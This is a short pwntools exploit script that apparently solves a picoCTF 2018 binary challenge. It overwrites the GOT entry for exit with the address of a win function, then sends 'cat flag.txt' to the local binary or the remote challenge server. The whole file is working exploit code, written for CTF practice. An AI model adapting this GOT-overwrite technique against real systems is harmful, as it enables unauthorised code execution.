#!/usr/bin/env python

from pwn import *
import sys

#get addresses
e = ELF('./auth')
win = e.symbols['win']
exit = e.got['exit']

context.log_level = 'info'

argc = len(sys.argv)

#local or remote
while True:
	if argc > 1:
		p = remote('2018shell.picoctf.com', 46464)
	else:
		p = process('./auth')

	#overwrite exit address with win address and cat the flag
	p.sendlineafter('\n', hex(exit)[2:])
	p.sendlineafter('\n', hex(win)[2:])
	p.sendline('cat flag.txt')
	try:
		#attempt to print the flag
		print p.recvuntil('}')
		p.close()
		break
	except:
		p.close()

	p.close()
